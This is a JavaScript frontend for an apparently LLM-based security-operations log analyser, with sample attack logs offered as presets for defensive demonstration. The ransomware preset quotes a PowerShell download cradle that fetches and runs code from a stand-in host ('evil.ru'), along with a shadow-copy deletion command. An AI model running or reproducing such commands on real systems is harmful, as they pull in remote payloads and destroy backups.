/* ======================================================
   LLM-Powered SOC Analyst — Frontend Logic
   Connects to FastAPI backend at http://localhost:8000
====================================================== */

const API_BASE = 'http://localhost:8000';
const FETCH_TIMEOUT_MS = 120_000; // 2 minutes — LLM can be slow

// ── Sample presets ────────────────────────────────────
const PRESETS = {
  bruteforce: `2024-01-15 03:22:11 Failed password for admin from 185.220.101.5 port 54231 ssh2
2024-01-15 03:22:14 Failed password for admin from 185.220.101.5 port 54234 ssh2
2024-01-15 03:22:17 Failed password for root from 185.220.101.5 port 54237 ssh2
2024-01-15 03:22:20 Failed password for ubuntu from 185.220.101.5 port 54240 ssh2
2024-01-15 03:22:23 Failed password for administrator from 185.220.101.5 port 54243 ssh2
2024-01-15 03:22:26 Failed password for admin from 185.220.101.5 port 54246 ssh2
2024-01-15 03:22:29 Failed password for admin from 185.220.101.5 port 54249 ssh2
2024-01-15 03:22:31 Accepted password for admin from 185.220.101.5 port 54251 ssh2
2024-01-15 03:22:31 pam_unix(sshd:session): session opened for user admin by (uid=0)`,

  lateral: `2024-01-15 09:14:03 User jsmith authenticated to WORKSTATION-01 via NTLM
2024-01-15 09:14:45 PsExec executed on FILESERVER-02 from WORKSTATION-01 by jsmith
2024-01-15 09:15:12 Net use \\\\FILESERVER-02\\ADMIN$ established from WORKSTATION-01
2024-01-15 09:15:20 cmd.exe launched as SYSTEM on FILESERVER-02 remotely
2024-01-15 09:16:05 Mimikatz process detected on FILESERVER-02 (hash: d38e2f6b...)
2024-01-15 09:16:40 LSASS memory access by non-system process on FILESERVER-02
2024-01-15 09:17:10 Pass-the-hash attempt to DC-01 from FILESERVER-02 using administrator hash
2024-01-15 09:17:55 Successful authentication to DC-01 from FILESERVER-02 (NTLM, administrator)`,

  exfil: `2024-01-15 14:30:01 Large file transfer initiated from 192.168.1.105 to 45.33.32.156
2024-01-15 14:30:15 DNS query storm: 192.168.1.105 querying suspicious.exfil-domain.ru
2024-01-15 14:31:00 Outbound traffic spike: 2.4 GB via port 443 to 45.33.32.156 in 60 seconds
2024-01-15 14:32:10 7zip compression of /var/data/customers/ detected on 192.168.1.105
2024-01-15 14:32:45 Encrypted archive uploaded via HTTPS to cloud storage (45.33.32.156)
2024-01-15 14:33:20 Base64-encoded payloads in DNS TXT records from 192.168.1.105
2024-01-15 14:34:55 DLP alert: PII data pattern matched in outbound traffic from 192.168.1.105`,

  ransomware: `2024-01-15 22:01:05 Suspicious macro execution in Word document: invoice_Q4.docm
2024-01-15 22:01:10 PowerShell.exe spawned by WINWORD.EXE (parent PID 4832)
2024-01-15 22:01:15 PowerShell download cradle: IEX(New-Object Net.WebClient).DownloadString('http://evil.ru/payload')
2024-01-15 22:01:22 C2 beacon established to 91.108.4.1:8080 from HOST-FINANCE-03
2024-01-15 22:02:00 Volume Shadow Copy deletion: vssadmin delete shadows /all /quiet
2024-01-15 22:02:10 Mass file rename detected: .docx → .locked on FILESERVER-01 shares
2024-01-15 22:02:40 Backup service stopped: veeambackupsvc terminated by ransomware process
2024-01-15 22:03:00 README_DECRYPT.txt created in 1,452 directories on FILESERVER-01`,
};

let currentReportRaw = '';
let activePreset = null;

// ── DOM refs ─────────────────────────────────────────
const logInput = document.getElementById('log-input');
const charCount = document.getElementById('char-count');
const investigateBtn = document.getElementById('investigate-btn');
const statusBadge = document.getElementById('status-badge');

const emptyState = document.getElementById('empty-state');
const loadingState = document.getElementById('loading-state');
const errorState = document.getElementById('error-state');
const reportContent = document.getElementById('report-content');

// ── Init ──────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  logInput.addEventListener('input', () => {
    const len = logInput.value.length;
    charCount.textContent = `${len.toLocaleString()} character${len !== 1 ? 's' : ''}`;
  });
  checkAPIStatus();
});

// ── API health check ──────────────────────────────────
async function checkAPIStatus() {
  try {
    const res = await fetch(`${API_BASE}/`, { signal: AbortSignal.timeout(4000) });
    if (res.ok) {
      statusBadge.classList.add('online');
      statusBadge.innerHTML = '<span class="pulse-dot"></span>API Online';
    }
  } catch {
    // stays offline
  }
}

// ── Presets ───────────────────────────────────────────
function loadPreset(name) {
  // toggle off if already active
  if (activePreset === name) {
    logInput.value = '';
    charCount.textContent = '0 characters';
    document.getElementById(`preset-${name}`)?.classList.remove('active');
    activePreset = null;
    return;
  }

  // deactivate previous
  if (activePreset) {
    document.getElementById(`preset-${activePreset}`)?.classList.remove('active');
  }

  logInput.value = PRESETS[name] ?? '';
  charCount.textContent = `${logInput.value.length.toLocaleString()} characters`;
  document.getElementById(`preset-${name}`)?.classList.add('active');
  activePreset = name;
  logInput.scrollTop = 0;
}

function clearLogs() {
  logInput.value = '';
  charCount.textContent = '0 characters';
  if (activePreset) {
    document.getElementById(`preset-${activePreset}`)?.classList.remove('active');
    activePreset = null;
  }
}

// ── Investigate ───────────────────────────────────────
let elapsedTimer = null;

async function investigate() {
  const logs = logInput.value.trim();
  if (!logs) {
    logInput.focus();
    logInput.style.borderColor = 'rgba(239,68,68,0.5)';
    setTimeout(() => { logInput.style.borderColor = ''; }, 1500);
    return;
  }

  setUIState('loading');
  animateLoadingSteps();
  startElapsedTimer();

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), FETCH_TIMEOUT_MS);

  try {
    const res = await fetch(`${API_BASE}/investigate`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ logs }),
      signal: controller.signal,
    });
    clearTimeout(timeoutId);

    if (!res.ok) {
      const err = await res.json().catch(() => ({}));
      throw new Error(err.detail ?? `Server returned ${res.status}`);
    }

    const data = await res.json();
    currentReportRaw = data.investigation ?? '';
    renderReport(currentReportRaw);
    setUIState('report');

    // mark API online after successful call
    statusBadge.classList.add('online');
    statusBadge.innerHTML = '<span class="pulse-dot"></span>API Online';

  } catch (err) {
    clearTimeout(timeoutId);
    let msg;
    if (err.name === 'AbortError') {
      msg = 'Request timed out after 2 minutes. The LLM may be overloaded — please try again.';
    } else if (err.message.toLowerCase().includes('fetch') || err.message.toLowerCase().includes('failed')) {
      msg = 'Cannot reach the backend API. Make sure uvicorn is running on port 8000.';
    } else {
      msg = err.message;
    }
    document.getElementById('error-msg').textContent = msg;
    setUIState('error');
  } finally {
    stopElapsedTimer();
  }
}

function startElapsedTimer() {
  let seconds = 0;
  const timerEl = document.getElementById('loading-elapsed');
  stopElapsedTimer();
  elapsedTimer = setInterval(() => {
    seconds++;
    if (timerEl) timerEl.textContent = `${seconds}s elapsed…`;
  }, 1000);
}

function stopElapsedTimer() {
  if (elapsedTimer) { clearInterval(elapsedTimer); elapsedTimer = null; }
}

// ── Loading step animation ────────────────────────────
// Steps animate up to the last one; the last step stays active (pulsing)
// until the API responds — this is intentional since the LLM can take 20–60s.
const STEP_IDS = ['step-parse', 'step-rag', 'step-llm', 'step-report'];
const STEP_DELAYS = [1200, 2500, 4000]; // ms between steps 1→2, 2→3, 3→4

function animateLoadingSteps() {
  STEP_IDS.forEach(id => {
    const el = document.getElementById(id);
    if (el) el.className = 'loading-step';
  });

  // activate step 0 immediately
  const activate = (idx) => {
    if (idx > 0) {
      const prev = document.getElementById(STEP_IDS[idx - 1]);
      if (prev) prev.className = 'loading-step done';
    }
    const cur = document.getElementById(STEP_IDS[idx]);
    if (cur) cur.className = 'loading-step active';

    // schedule next step (except the last — it stays active until response)
    if (idx < STEP_IDS.length - 1) {
      setTimeout(() => activate(idx + 1), STEP_DELAYS[idx] ?? 2500);
    }
    // The last step (step-report) stays 'active' and pulses indefinitely
    // — this is correct; the UI is NOT frozen, the LLM is just slow.
  };
  activate(0);
}

// ── UI State ──────────────────────────────────────────
function setUIState(state) {
  const states = {
    empty: emptyState,
    loading: loadingState,
    error: errorState,
    report: reportContent,
  };

  Object.entries(states).forEach(([key, el]) => {
    el.classList.toggle('hidden', key !== state);
  });

  investigateBtn.disabled = (state === 'loading');
  investigateBtn.querySelector('.btn-text').textContent =
    state === 'loading' ? 'Investigating…' : 'Investigate';
}

// ── Report Parser & Renderer ──────────────────────────
function renderReport(raw) {
  raw = raw.replace(/\*\*(.*?)\*\*/g, '$1'); // strip markdown bold

  // Extract field values using flexible regex
  const extract = (label) => {
    const pattern = new RegExp(
      `(?:^|\\n)[\\s\\*-]*${label}[:\\s]+([\\s\\S]*?)(?=\\n[\\s\\*-]*(?:attack_stage|mitre_technique|severity|confidence|explanation|recommended_actions)[:\\s]|$)`,
      'im'
    );
    const m = raw.match(pattern);
    return m ? m[1].trim() : null;
  };

  const attack_stage = extract('attack[_\\s]stage');
  const mitre_technique = extract('mitre[_\\s]technique');
  const severity = extract('severity');
  const confidence = extract('confidence');
  const explanation = extract('explanation');
  const recommended_actions = extract('recommended[_\\s]actions');

  // Attack stage
  document.getElementById('attack-stage').textContent = attack_stage || 'Unknown';

  // MITRE technique
  document.getElementById('mitre-technique').textContent = mitre_technique || 'Unknown';

  // Severity banner
  const sevLevel = (severity || '').toLowerCase().replace(/[^a-z]/g, '');
  const banner = document.getElementById('severity-banner');
  banner.className = 'severity-banner';
  if (['critical', 'high', 'medium', 'low'].includes(sevLevel)) banner.classList.add(sevLevel);
  document.getElementById('severity-value').textContent = severity || '—';
  document.getElementById('confidence-value').textContent = confidence || '—';

  // Explanation
  document.getElementById('explanation').innerHTML = formatBullets(explanation || raw);

  // Recommended actions
  document.getElementById('recommended-actions').innerHTML = formatBullets(recommended_actions || '');

  // Timestamp
  document.getElementById('report-time').textContent = new Date().toLocaleTimeString();

  // Raw
  document.getElementById('raw-content').textContent = raw;
}

function formatBullets(text) {
  if (!text) return '<em style="color:var(--text-muted)">Not specified</em>';

  // Split by bullet-like markers or newlines
  const lines = text.split('\n').map(l => l.replace(/^[\s\*\-\•\d\.\)]+/, '').trim()).filter(Boolean);

  if (lines.length <= 1) {
    return `<p>${escapeHtml(text.trim())}</p>`;
  }

  return `<ul>${lines.map(l => `<li>${escapeHtml(l)}</li>`).join('')}</ul>`;
}

function escapeHtml(str) {
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

// ── Copy report ───────────────────────────────────────
function copyReport() {
  if (!currentReportRaw) return;
  navigator.clipboard.writeText(currentReportRaw).then(() => {
    const btn = document.getElementById('copy-btn');
    btn.innerHTML = `
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
        <polyline points="20,6 9,17 4,12"/>
      </svg>
      Copied!`;
    btn.style.color = 'var(--severity-low)';
    setTimeout(() => {
      btn.innerHTML = `
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
          <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
          <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/>
        </svg>
        Copy`;
      btn.style.color = '';
    }, 2000);
  });
}
